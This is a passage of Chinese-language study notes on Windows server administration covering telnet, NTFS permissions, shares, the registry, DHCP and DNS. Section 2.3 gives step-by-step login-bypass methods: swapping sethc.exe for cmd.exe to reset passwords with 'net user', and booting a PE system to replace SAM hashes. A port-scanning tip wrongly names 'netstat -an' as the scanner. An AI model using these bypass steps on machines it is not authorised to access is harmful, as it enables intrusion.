<h3 id="2-2-telnet"><a href="#2-2-telnet" class="headerlink" title="2.2 telnet"></a>2.2 telnet</h3><p>步骤：<br>1）网络配置，同上<br>2）win+R — 输入services.msc—找到telnet服务并打开（win11需要手动添加telnet服务，然后打开）</p>
<p>注意：如果使用非管理员的账户登陆远程，需要在服务器上将用户加入到<strong>telnet远程桌面内置组 Telnet Clients</strong>中</p>
<p>tips:在某个区域内，一但联网获取ip之后，就能获得当前区域的网段，然后就可以对该网段的所有可用ip地址进行端口号扫描（netstat -an），看哪些ip开了某些特殊的端口（比如 telnet的端口号 23，SSH是 22，远程桌面是3389）。勒索病毒一般是通过 445 端口进来的</p>
<h3 id="2-3-破解windows密码"><a href="#2-3-破解windows密码" class="headerlink" title="2.3 破解windows密码"></a>2.3 破解windows密码</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">win7破解密码：需要系统存在某一特定的漏洞</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">1.第一个漏洞：连续点击五次<span class="hljs-built_in">shift</span>键，出现粘滞键(在屏幕锁定依旧可以调用)，这个程序在 c:\windows\system32\sethc.exe</span><br>怎么利用：将sethc.exe替换成cmd.exe,然后通过net user 修改密码<br>怎么替换：<br>	关机，在出现window图标的时候，拔掉电源，再开机，此时就会出现windows错误恢复的界面（不行就多试几次）<br>	然后选择启动修复---一段时间后会显示 是否还原：否-----一段时间后显示 是否将错误信息发送给微软，底下有俩个超链接<br>	第一个超链接是微软的官网，另一个是一个内置记事本，选择第二个打开记事本---在记事本中 文件 选项中选择 打开，就能进入文件资		源管理程序-----在该程序中可以将sethc.exe替换成cmd.exe,由于没有登陆，此时打开的cmd窗口是管理员权限的<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">2.利用PE系统（微型维修系统）破解开机密码</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">原理，利用U盘启动PE系统，将原winodws中存储密码的SAM文件中的加密密码替换</span><br>步骤：<br>1）下载软件：U深度增强版（或者其它最新的PE系统）<br>注意：在虚拟机中需要下载 PE系统的iso镜像<br>2) 使用虚拟机的话，将光盘改成PE的iso镜像。自己的电脑的话在bios界面改成u盘启动（需要在u盘中装好PE系统，使用步骤1的软件即可）<br>3）里面直接有一键破解密码的工具<br></code></pre></td></tr></table></figure>



<h2 id="3-NTFS安全权限"><a href="#3-NTFS安全权限" class="headerlink" title="3.NTFS安全权限"></a>3.NTFS安全权限</h2><h3 id="3-1NTFS权限概述"><a href="#3-1NTFS权限概述" class="headerlink" title="3.1NTFS权限概述"></a>3.1NTFS权限概述</h3><p>​	1）通过设置NTFS权限，实现不同的用户访问不同对象（文件和文件夹）的权限<br>​	2）分配了正确的访问权限后，用户才能访问其资源<br>​	3）设置权限防止资源被篡改，删除</p>
<h3 id="3-2文件系统概述"><a href="#3-2文件系统概述" class="headerlink" title="3.2文件系统概述"></a>3.2文件系统概述</h3><p>​	文件的系统即在外部存储设备上组织文件的方法		若是一个分区不建立文件系统，那么该分区就无法存储数据<br>​	常用的文件系统：<br>​		1）FAT 		windows<br>​		2）NTFS	  windows<br>​		3）EXT 		Linux</p>
<h3 id="3-3NTFS文件系统的特点-都是FATS不具备的"><a href="#3-3NTFS文件系统的特点-都是FATS不具备的" class="headerlink" title="3.3NTFS文件系统的特点(都是FATS不具备的)"></a>3.3NTFS文件系统的特点(都是FATS不具备的)</h3><p>​	1）提高磁盘的读写性能<br>​	2）可靠性：加密文件系统、访问控制列表（设置权限）<br>​	3）磁盘利用率：压缩、磁盘配额<br>​	4）支持单个文件大于4个g</p>
<h3 id="3-4修改NTFS权限"><a href="#3-4修改NTFS权限" class="headerlink" title="3.4修改NTFS权限"></a>3.4修改NTFS权限</h3><h4 id="3-4-1-取消权限继承"><a href="#3-4-1-取消权限继承" class="headerlink" title="3.4.1 取消权限继承"></a>3.4.1 取消权限继承</h4><p>​	作用：取消后，可以任意修改权限列表<br>​	方法：文件夹右键属性–安全–高级–去掉第一个对号–选择复制即可	</p>
<p>​	一般文件夹都会继承父文件夹的ACL，且子文件夹不能对继承过来的ACL进行修改，只有取消继承之后才可以</p>
<h4 id="3-4-2-文件及文件夹权限"><a href="#3-4-2-文件及文件夹权限" class="headerlink" title="3.4.2 文件及文件夹权限"></a>3.4.2 文件及文件夹权限</h4><p>​	特殊权限：控制文件夹权限列表的权限（可以赋予其它用户权限）</p>
<h4 id="3-4-3权限累加"><a href="#3-4-3权限累加" class="headerlink" title="3.4.3权限累加"></a>3.4.3权限累加</h4><p>​	当用户同时属于多个组时，权限是累加的</p>
<h4 id="3-4-5拒绝最大"><a href="#3-4-5拒绝最大" class="headerlink" title="3.4.5拒绝最大"></a>3.4.5拒绝最大</h4><p>​	当一个用户同属于一个有权限的组和一个无权限的组时，该用户对该文件夹无权限</p>
<h4 id="3-4-6取得所有权"><a href="#3-4-6取得所有权" class="headerlink" title="3.4.6取得所有权"></a>3.4.6取得所有权</h4><p>​	默认只有administrator有这个权限<br>​	作用：可以将任何文件夹的所有者改为administrator，<strong>可以将某个用户创建的文件夹修改所有权</strong></p>
<h4 id="3-4-7强制继承"><a href="#3-4-7强制继承" class="headerlink" title="3.4.7强制继承"></a>3.4.7强制继承</h4><p>​	作用：对下强制继承父子关系<br>​	方法：文件夹右键属性–安全–高级–勾上第二个对号，即可</p>
<h4 id="3-4-8文件复制对权限的影响"><a href="#3-4-8文件复制对权限的影响" class="headerlink" title="3.4.8文件复制对权限的影响"></a>3.4.8文件复制对权限的影响</h4><p>​	文件复制后，文件的权限会被目标文件夹的权限覆盖掉（跨分区也会），如果移动的话，权限是不会变的（若是跨分区移动，权限会被覆盖）</p>
<h2 id="4-文件共享服务器"><a href="#4-文件共享服务器" class="headerlink" title="4.文件共享服务器"></a>4.文件共享服务器</h2><h3 id="4-1共享服务器概述"><a href="#4-1共享服务器概述" class="headerlink" title="4.1共享服务器概述"></a>4.1共享服务器概述</h3><p>​	通过网络提供文件共享服务，提供文件的下载和上传服务（类似FTP服务）</p>
<p>​	注意：其使用<strong>CIFS</strong>协议，该协议并不通用（一般在windows中使用）。一般对内使用。FTP协议是通用的，一般对外使用。</p>
<h3 id="4-2创建共享"><a href="#4-2创建共享" class="headerlink" title="4.2创建共享"></a>4.2创建共享</h3><p>​	方法：文件夹右键属性–共享–开启共享–设置共享名–设置共享权限</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">访问：使用UNC地址<br>win+R --- 输入 \\+ip --- 输入账号密码<br></code></pre></td></tr></table></figure>

<p>​	注意：<br>​		1）在本地登陆时，只受NTFS权限的影响<br>​		2）在远程登陆时，将受共享及NTFS权限的共同影响，且取交集<br>​		3）建议设置共享权限为everyone完全控制，然后具体的权限在NTFS权限中设置即可</p>
<h3 id="4-3访问隐藏共享的方法"><a href="#4-3访问隐藏共享的方法" class="headerlink" title="4.3访问隐藏共享的方法"></a>4.3访问隐藏共享的方法</h3><p>​	隐藏共享文件夹的方法：在设置名称的最后面加上一个 “$” 符号即可</p>
<p>​	访问隐藏共享文件夹的方法：\服务器ip\共享名$</p>
<h3 id="4-4共享相关命令"><a href="#4-4共享相关命令" class="headerlink" title="4.4共享相关命令"></a>4.4共享相关命令</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">net share		#列出共享列表<br>net share 共享名 /del  #删除共享<br>net share C$:c:\  #创建共享<br></code></pre></td></tr></table></figure>

<h3 id="4-5屏蔽系统隐藏共享自动产生（c-d-等。。）"><a href="#4-5屏蔽系统隐藏共享自动产生（c-d-等。。）" class="headerlink" title="4.5屏蔽系统隐藏共享自动产生（c$,d$等。。）"></a>4.5屏蔽系统隐藏共享自动产生（c$,d$等。。）</h3><p>​	步骤：<br>​		1）打开注册表：regedit<br>​		2）定位共享注册表的位置：</p>
<p>​					HKEY_Local_MACHINE\System\CurrentControlSet\Services\LanmanServer\Parameters<br>​					接着右键新建 REG_DWORD类型的“AutoShareServer”键，值为 0</p>
<h3 id="4-6查看本地网络连接状态"><a href="#4-6查看本地网络连接状态" class="headerlink" title="4.6查看本地网络连接状态"></a>4.6查看本地网络连接状态</h3><p>​	netstat -an</p>
<h3 id="4-7关闭445服务（关闭后整个共享服务都无法使用）"><a href="#4-7关闭445服务（关闭后整个共享服务都无法使用）" class="headerlink" title="4.7关闭445服务（关闭后整个共享服务都无法使用）"></a>4.7关闭445服务（关闭后整个共享服务都无法使用）</h3><p>​	可以通过445端口来屏蔽病毒传入（比如勒索病毒等）</p>
<p>​	方法1：打开services.msc,并停止及禁用server服务</p>
<p>​	方法2：禁止被访问445。  配置高级安全防火墙—入站规则（要求win7及以上系统，win2008及以上系统），禁用访问TCP和UDP445端口</p>
<h2 id="补充1-：注册表"><a href="#补充1-：注册表" class="headerlink" title="(补充1)：注册表"></a><code>(补充1)：注册表</code></h2><h3 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h3><ul>
<li>注册表是windows操作系统、硬件设备以及客户应用程序得以正常运行和保存设的核心“数据库”，也可以说是一个非常庞大的树状分层结构的数据库系统</li>
<li>注册表记录了用户安装在计算机的软件和每个程序的相互关联的信息，它包括了计算机的硬件配置，包括自动配置的即插即用的设备和已有的各种设备说明、状态属性以及各种状态信息和数据。利用一个功能强大的注册表数据库来统一集中管理系统硬件设施、软件配置等信息，从而方便管理，增强系统稳定性。</li>
<li>早期的注册表是由.ini为后缀的文件组成，windows 95后的注册表由多个文件组成，且提供了注册表编辑器</li>
</ul>
<h3 id="2-注册表结构"><a href="#2-注册表结构" class="headerlink" title="2.注册表结构"></a>2.注册表结构</h3><ul>
<li>注册表结构以树状结构进行呈现<ul>
<li>子树（实际只有俩颗子树，为了方便操作，分成了5颗子树）<ul>
<li><code>HKEY_LOCAL_MACHINE</code>：记录关于本地计算机系统的信息，包括硬件和操作系统数据</li>
<li><code>HKEY_USERS</code>：记录关于动态加载的用户配置文件和默认配置文件的信息（应用程序信息）</li>
<li><code>HKEY_CURRENT_USER</code>：<code>HKEY_USERS</code>子树，它指向<code>HKEY_USERS\当前用户的安全ID</code>，包含当前以交互方式登陆的用户的用户配置文件</li>
<li><code>HKEY_CURRENT_CONFIG</code>：<code>HKEY_LOCAL_MACHINE</code>子树，指向<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Hardware Profiles\Current</code>，包含在启动时由本地计算机系统使用的硬件配置文件的相关信息加载的设备驱动程序，显示时要使用的分辨率</li>
<li><code>HKEY_CLASS_ROOT</code>：<code>HKEY_CURRENT_USER</code>子树，包含用于各种OLE技术和文件类关联数据的信息</li>
</ul>
</li>
<li>项<ul>
<li>可以简单的理解为文件夹，项中可以包含项和值</li>
</ul>
</li>
<li>值<ul>
<li>每个注册表项或子项都可以包含称为值的数据</li>
<li>部分值应用于某个用户的信息</li>
<li>部分值应用于计算机所有用户的信息</li>
<li>值由三部分组成：值的名称、值类型、值数据</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="3-注册表的基本操作"><a href="#3-注册表的基本操作" class="headerlink" title="3.注册表的基本操作"></a>3.注册表的基本操作</h3><ul>
<li>创建项</li>
<li>创建值（六种类型的值）<ul>
<li>字符串值（REG_SZ）：固定长度的文本字符串</li>
<li>二进制值（REG_BINARY）：原始二进制数据。多数硬件组件信息都以二进数据存储</li>
<li>DWORD值（REG_DWORD）：数据由4字节长的数表示。设备驱动程序和服务的很多参数都是这种类型</li>
<li>QWORD值（REG_QWORD）：数据由8字节长的数表示</li>
<li>多字符串值（REG_MUlTI_SZ）：多重字符串。包含列表或多值的值通常为该类型</li>
<li>可扩充字符串值（REG_EXPAND_SZ）：长度可变的数据串。该数据类型包含在程序或服务使用该数据时解析的变量</li>
</ul>
</li>
<li>修改、删除和重命名值</li>
<li>注册表编辑技巧<ul>
<li>查找字符串、值或项</li>
<li>将子项添加到收藏夹</li>
<li>打印注册表</li>
<li>复制项名字</li>
</ul>
</li>
</ul>
<h3 id="4-注册表的维护与优化"><a href="#4-注册表的维护与优化" class="headerlink" title="4.注册表的维护与优化"></a>4.注册表的维护与优化</h3><ul>
<li>注册表的维护<ul>
<li>注册表被破坏后的常见现象<ul>
<li>无法启动系统</li>
<li>无法运行或正常运行合法的应用程序</li>
<li>找不到启动系统或运行应用程序所需的文件</li>
<li>没有访问应用程序的权限</li>
<li>不能正确安装或装入驱动程序</li>
<li>不能进行网络连接</li>
<li>注册表条目有错误</li>
</ul>
</li>
<li>注册表被破坏的原因<ul>
<li>应用程序错误：在系统中安装过多的软件后，可能会出现彼此之间的冲突</li>
<li>驱动程序不兼容：安装系统时有很多驱动程序都是自动安装的，容易产生不同硬件驱动程序不兼容的情况</li>
<li>硬件问题：硬件质量不行，比如内存或硬盘质量不过关造成读写错误，超频、CMOS、病毒等</li>
<li>误操作：不小心误删或者添加某些值</li>
</ul>
</li>
<li>备份注册表<ul>
<li>直接将注册表进行备份：导出即可</li>
</ul>
</li>
<li>恢复注册表：导入即可</li>
<li>锁定和解锁注册表：通过注册表修改（上网查），<code>此时若要解锁需要借助第三方来编辑注册表，如RegWorkshop</code></li>
</ul>
</li>
<li>注册表的优化<ul>
<li>清除多余的DLL文件<ul>
<li>hk_Local_mach\software\micro\win\curVer\SharedDLL：存放共享DLL信息，括号中的值代表共享文件的数目，若为0，可将其删除</li>
<li>hk_cur_user\software和hk_local_mach\software：包含系统中的应用程序，对于已知的程序是知道的，删除一些未知程序及卸载程序的残留</li>
<li>删除多余时区（必要情况下只保留北京）：hk_l_mach\sof\micro\wind NT\curVer\Time Zones</li>
<li>清除多余的语言代码（英语-0490、中文-0804）：h-l-m\sys\curContrSet\contro\Nis\locale</li>
<li>删除多余的键盘布局：hlm\sys\curContrSet\contro\Keyboard Layouts，每个子项代表一种键盘布局</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="5-DHCP部署与安全"><a href="#5-DHCP部署与安全" class="headerlink" title="5.DHCP部署与安全"></a>5.DHCP部署与安全</h2><h3 id="5-1DHCP的作用"><a href="#5-1DHCP的作用" class="headerlink" title="5.1DHCP的作用"></a>5.1DHCP的作用</h3><p>​	自动分配ip地址（Dynamic Host Configure Protocol）</p>
<h3 id="5-2DHCP相关概念"><a href="#5-2DHCP相关概念" class="headerlink" title="5.2DHCP相关概念"></a>5.2DHCP相关概念</h3><p>​	地址池&#x2F;作用域：（ip、子网掩码、网关、DNS、租期），DHCP协议端口是<strong>UDP 67&#x2F;68</strong></p>
<h3 id="5-3DHCP优点"><a href="#5-3DHCP优点" class="headerlink" title="5.3DHCP优点"></a>5.3DHCP优点</h3><p>​	减少工作量，避免ip冲突，提高地址利用率</p>
<h3 id="5-4DHCP原理"><a href="#5-4DHCP原理" class="headerlink" title="5.4DHCP原理"></a>5.4DHCP原理</h3><h4 id="5-4-1-也称为DHCP租约过程，分为4个步骤："><a href="#5-4-1-也称为DHCP租约过程，分为4个步骤：" class="headerlink" title="5.4.1.也称为DHCP租约过程，分为4个步骤："></a>5.4.1.也称为DHCP租约过程，分为4个步骤：</h4><p>​	<strong>1）客户机发送DHCP Discovery广播包</strong><br>​			客户机广播请求ip地址（包含客户机的MAC地址）<br>​	<strong>2）服务器响应 DHCP Offer广播包</strong><br>​			服务器响应提供的ip地址（但无子网掩码、网关等参数）<br>​	<strong>3）客户机发送DHCP Request 广播包</strong><br>​			客户机选择IP（也可确认为确认使用哪个IP）<br>​	<strong>4）服务器发送DHCP ACK 广播包</strong><br>​			服务器确定了租约，并提供网卡详细参数ip、掩码、网关、DNS、租期等</p>
<h4 id="5-4-2-DHCP-续约过程"><a href="#5-4-2-DHCP-续约过程" class="headerlink" title="5.4.2.DHCP 续约过程"></a>5.4.2.DHCP 续约过程</h4><p>​			当租约过了50%后，客户机会再次发送DHCP Request包，进行续约；若服务器无响应，则继续使用并在87.5%再次发送DHCP Request 包进行续约，若仍然无响应，释放地址，并重新发送DHCP Discovery 广播包来获取ip地址 </p>
<p>​			<strong>注意：若是释放地址后，重新请求DHCP服务器无响应时，此时电脑网卡会自动给自己分配一个地址（169.254.x.x&#x2F;16，但是无法上网，但能保证局域网内通信）</strong></p>
<h3 id="5-5-部署DHCP服务器"><a href="#5-5-部署DHCP服务器" class="headerlink" title="5.5 部署DHCP服务器"></a>5.5 部署DHCP服务器</h3><p>​	windows, linux, 三层交换机 以及 路由器 等都可以作为DHCP服务器</p>
<p>​	名词：<br>​			DHCP选项：网关、DNS等信息，没有网关是上不了网的<br>​			WINS服务器：DNS上一代的产物，现在已经不用</p>
<p>​	1）IP地址固定（服务器必须固定ip地址），所以必须预留好ip<br>​	2）安装DHCP服务插件<br>​	3）新建作用域及作用域选项<br>​	4）激活  ： 激活之前先检查一遍<br>​	5）客户机验证</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">ipconfig /release  #释放ip 取消租约<br>ipconfig /renew   #重新获取ip，若是已经分配ip，则该指令为续约<br></code></pre></td></tr></table></figure>

<p>​	注意：释放ip的情况：1.使用release命令  2.手动配置ip</p>
<h3 id="5-6地址保留"><a href="#5-6地址保留" class="headerlink" title="5.6地址保留"></a>5.6地址保留</h3><p>​	在配置好的dhcp服务器上有一个 保留 的菜单，新建保留—-填写 MAC 地址—填写ip地址<br>​	作用：将该ip固定分配给该MAC地址的主机（服务器上实现固定ip）</p>
<h3 id="5-7DHCP备份与还原"><a href="#5-7DHCP备份与还原" class="headerlink" title="5.7DHCP备份与还原"></a>5.7DHCP备份与还原</h3><p>​	1）备份<br>​		直接在配置好的服务器上右键—备份–选择路径 即可</p>
<p>​	2）还原</p>
<p>​		在对应的服务器上右键—-还原—-选择备份好的文件</p>
<p>​	<strong>注意：</strong></p>
<ol>
<li><strong>若是直接删除了服务器，则当前的dhcp服务依旧在运行，只是无法显示，但是若是将作用域删除，则该服务停止运行，若是要还原，则直接在<code>DHCP</code>上右键—添加服务器—查找—-选择自己服务器即可</strong></li>
<li><strong>必须关闭防火墙，其它人才能访问服务器的67,68端口号，防火墙默认不让其他人访问这两个端口</strong></li>
<li><strong>服务器提供的地址和提供的地址必须要在同一网段</strong></li>
</ol>
<h3 id="5-8选项优先级（important）"><a href="#5-8选项优先级（important）" class="headerlink" title="5.8选项优先级（important）"></a>5.8选项优先级（important）</h3><p>​	作用域选项 &gt; 服务器选项</p>
<p>​	<strong>注意：当服务器上有多个作用域时，可以在服务器选项上设置DNS服务器</strong></p>
<h3 id="5-9DHCP的攻击与防御"><a href="#5-9DHCP的攻击与防御" class="headerlink" title="5.9DHCP的攻击与防御"></a>5.9DHCP的攻击与防御</h3><p>​	1）攻击DHCP服务器：频繁发送伪装的DHCP请求，直到将DHCP池资源耗尽<br>​		  防御：在交换机上（管理型）的端口上做<strong>动态MAC地址绑定</strong>：通过网线绑定某一设备的MAC,该设备的ip不变,当该设备的MAC地址改变后，认为该设备有攻击嫌疑，不允许申请新ip。</p>
<p>​		动态绑定：通过网线绑定某一设备的MAC地址，但是当把网线拔掉之后，就会失效；当新设备插上网线后，就会绑定新设备的MAC地址</p>
<p>​		静态绑定：将某一设备的MAC直接绑定在交换机端口上（永远记住MAC地址），当新设备插上网线，会因为MAC地址不一致，导致不能上网</p>
<p>​	2）伪装DHCP服务器攻击：hack通过将自己部署为DHCP服务器，为客户机提供非法ip地址<br>​		  防御：在交换机上，除合法的DHCP服务器所在的接口外，全部设置为禁止DHCP offer包</p>
<h2 id="6-DNS部署与安全"><a href="#6-DNS部署与安全" class="headerlink" title="6.DNS部署与安全"></a>6.DNS部署与安全</h2><h3 id="6-1DNS-Domain-Name-Service"><a href="#6-1DNS-Domain-Name-Service" class="headerlink" title="6.1DNS (Domain Name Service)"></a>6.1DNS (Domain Name Service)</h3><p>​	域名服务器<br>​	作用：为客户机提供域名解析服务</p>
<h3 id="6-2域名组成"><a href="#6-2域名组成" class="headerlink" title="6.2域名组成"></a>6.2域名组成</h3><h4 id="6-2-1域名组成概述"><a href="#6-2-1域名组成概述" class="headerlink" title="6.2.1域名组成概述"></a>6.2.1域名组成概述</h4><p>​	如<code>www.sina.com.cn</code>是一个域名，从严格意义上讲，<code>sina.com.cn</code>才被称为<strong>域名</strong>（全球唯一），而<code>www</code>是主机名。<br>​	<code>主机名.域名</code>称为完全限定域名（FQDN）。<strong>一个域名下可以有多个主机</strong>，域名全球唯一，那么<code>主机名.域名</code>肯定也是全球唯一。</p>
<p>​	以<code>sina.com.cn</code>域名为例，一般管理员在命名其主机的时候会根据其主机的功能而命名，比如网站的是的<code>www</code>，博客的是<code>blog</code>,论坛的是<code>bbs</code>,那么对应的FQDN为<code>www.sina.com.cn</code>，<code>blog.sina.com.cn</code>，<code>bbs.sina.com.cn</code>;这么多个FQDN，只需要申请一个域名<code>sina.com.cn</code>即可</p>
<h3 id="6-2-2域名组成"><a href="#6-2-2域名组成" class="headerlink" title="6.2.2域名组成"></a>6.2.2域名组成</h3><p>​	树形结构：（<strong>好像没有 一级域名 的说法，顶级后面就从 二级域名 开始</strong>）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">							     根<br>      	     |----------------------|---------------------|<br>             | 		    |	|	 |	  |	   |	    |	|		   <br>顶级域名     aero  ...  com  net  org  edu  gov  ...  cn  uk...<br>		        |-------|------|              |------|----|<br>二级域名	    cctv ... ibm  huawei		  bj ... edu  com<br>             |---|----|                            |--|-------|<br>三级域名     mail ... www                        tsinghua ... pku<br>					                          |--|----|<br>四级域名                                       mail ... www<br><br>其中:<br>根域：.<br>顶级域<br>	国家顶级域 cn jp hk uk<br>	商业顶级域<br>		com 商业机构<br>		gov 政府机构<br>		mil 军事机构<br>		edu 教育机构<br>		org 民间组织机构<br>		net 互联网<br>二级域名<br>三级域名<br>。。。<br><br>例子：<br>www.baiud.com.  : .com为顶级域名，baidu为二级域名， www为主机名(注意最后面有个 . ，为根域)<br>FQDN = 主机名.DNS后缀<br>FQDN(完整合格的域名)<br></code></pre></td></tr></table></figure>

<h3 id="6-2-3监听端口"><a href="#6-2-3监听端口" class="headerlink" title="6.2.3监听端口"></a>6.2.3监听端口</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">TCP 53<br>UDP 53<br></code></pre></td></tr></table></figure>

<h3 id="6-2-4DNS解析种类"><a href="#6-2-4DNS解析种类" class="headerlink" title="6.2.4DNS解析种类"></a>6.2.4DNS解析种类</h3><p>1）按照查询方式分类</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1.递归查询：客户机与本地DNS服务之间<br>2.迭代查询：本地DNS服务器与根等其它DNS服务器的解析过程<br></code></pre></td></tr></table></figure>

<p><img src="/staticImg/image-20240330015142301.png" alt="image-20240330015142301"></p>
<p>2）按照查询内容分类</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1.正向解析：已知域名，解析ip地址  （绝大部分用户都是正向解析）<br>2.反向解析：已知ip地址，解析域名<br></code></pre></td></tr></table></figure>

<h3 id="6-2-5DNS服务器的搭建"><a href="#6-2-5DNS服务器的搭建" class="headerlink" title="6.2.5DNS服务器的搭建"></a>6.2.5DNS服务器的搭建</h3><p>​	与DHCP服务器一样，在光驱上找到服务并安装即可</p>
<p>​	<strong>注意：一旦服务安装，且tcp 53端口和udp 53端口打开了，此时就已经是一台DNS服务器，因为其自带根服务器的信息，若是有主机的dns服务器地址指向该服务器，若是该服务器不能处理，会去找根服务器，且处理完之后会将结果进行缓存，因此这种无需配置的纯粹的DNS服务器也称为“缓存服务器”</strong></p>
<h4 id="（1）搭建步骤：安装好服务之后"><a href="#（1）搭建步骤：安装好服务之后" class="headerlink" title="（1）搭建步骤：安装好服务之后"></a>（1）搭建步骤：安装好服务之后</h4><p>​		1）在正向查找区域（正向解析服务）—右键—新建区域<br>​		2）选择区域类型：主要区域、辅助区域、存根区域（新建选择 主要区域）<br>​				主要区域：主服务器<br>​				辅助区域：备份区域，已经存在主服务器，为了防止主服务器宕机，设置的一个备选项<br>​				存根服务器：根域，普通人员一般用不到<br>​		3）设置区域名称<br>​				比如将区域名称设置为 <code>baidu.com</code>,意味着该服务为这个域的<strong>权威服务器</strong>，一旦是该域下的一律由该服务器解析<br>​		4）保存区域解析文件<br>​		5）动态更新 选择 不允许动态更新<br>​		6）完成</p>
<p>名词解释：（服务器中的两条记录）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">起始授权机构（SOA): 谁是某个区域名称的权威服务器（全球唯一）<br>名称服务器（NS）:目前负责该区域名称的服务器是谁，包括备份DNS服务器<br>通俗来说就是：SOA 说明负责区域名称为 baidu.com 的权威服务器是谁，NS说明负责区域名称为 baidu.com 的服务器有那几条台<br></code></pre></td></tr></table></figure>

<h4 id="（2）创建主机"><a href="#（2）创建主机" class="headerlink" title="（2）创建主机"></a>（2）创建主机</h4><p>​		右键—新建主机—填写主机名（例如 www）— 填写ip地址—-添加主机</p>
<h4 id="（3）测试"><a href="#（3）测试" class="headerlink" title="（3）测试"></a>（3）测试</h4><p>​		在win2003中同时开启DHCP和DNS服务器，将DHCP服务器中的dns地址指向win2003，此时win2003同时作为DHCP和DNS服务器；接着在xp中使用 <code>nslookup www.baidu.com</code>命令，解析域名即可。</p>
<p>​		或者直接使用 <code>ping www.baidu.com</code>命令，也可以看到效果.。</p>
<p>​		<strong>注意：在解析过程中，前面的内容可能出现一些 <code>request timed out</code> 的字样，这是因为当我们需要向DNS服务器请求解析服务时，并不是第一时间将域名发给服务器进行解析，而是先询问服务器的域名（反向解析），由于该服务器未设置域名，因此出现上面的情况</strong>；<br>​		如何解决上述情况：<br>​			<strong>首先</strong>依旧创建主机，将地址设置为DNS服务器的地址，在最后添加主机的时候，勾选 <code>创建相关的指针(PTR)记录</code> （忽略警告）即可；<br>​			<strong>接着</strong>在 <code>反向查找区域</code> 右键创建—–选择主要区域—–输入网络id(服务器地址：10.1.1.22，网路id：10.1.1)—-全部下一步直到完成；<br>​			<strong>接着</strong>在刚创建的区域右键—-创建指针—-输入主机ip（输入上一步未输入的那一位：22）—- 选择主机名（直接查找到正向区域创建的A记录）—确定即可</p>
<p>​		<strong>一般这种测试i需要使用命令 <code>ipconfig /flushdns</code> 刷新本机dns缓存</strong></p>
<p>​		<strong>查看本机dns缓存内容：<code>ipconfig /displaydns</code></strong></p>
<h4 id="（4）DNS解析转发"><a href="#（4）DNS解析转发" class="headerlink" title="（4）DNS解析转发"></a>（4）DNS解析转发</h4><p>​		首先在win2003-1和win2003-2各自创建一台DNS服务器，其中1用于解析 <code>www.baidu.com</code>，2用于解析 <code>www.qq.com</code>;<br>​		接着在win2003-1的DNS服务器上右键—-属性—–选择转发器菜单（这步可以查看菜单<code>根提示</code>，里面记载了全球的13台根服务器的地址）—– 填写转发器的ip地址（需要转发到哪台DNS服务器）—–添加即可</p>
<h4 id="（5）辅助DNS服务器的搭建与配置"><a href="#（5）辅助DNS服务器的搭建与配置" class="headerlink" title="（5）辅助DNS服务器的搭建与配置"></a>（5）辅助DNS服务器的搭建与配置</h4><p>​		首先同样需要在win2003-1和win2003-2各自创建一台DNS服务器；<br>​		接着在win2003-1的服务器的正向查找区域的<code>baidu.com</code>上右键（备份的是区域而不是服务器）—-属性—-选择区域复制菜单—-选择只允许到下列服务器—–添加服务器ip地址—确定即可；<br>​		接着在win2003-2上新建区域—–辅助区域—-设置名称（一般设置的和复制中的名称一致）—–设置主服务器ip—-完成</p>
<h4 id="（6）清空DNS服务器的缓存"><a href="#（6）清空DNS服务器的缓存" class="headerlink" title="（6）清空DNS服务器的缓存"></a>（6）清空DNS服务器的缓存</h4><p>​		打开DNS服务，选中对应服务器并在最上面一栏的菜单中选择 <code>查看</code>—-高级；接着在左边栏就会出现一项 <code>缓存的查找</code>;<br>​		接着对准<code>缓存的查找</code>右键—–清除缓存，最后将<code>高级</code>取消掉</p>
<h4 id="（7）别名"><a href="#（7）别名" class="headerlink" title="（7）别名"></a>（7）别名</h4><p>​		在某个名称域右边栏右键—-新建别名（CNAME）——设置别名—–选择目标主机的FQDN—–完成</p>
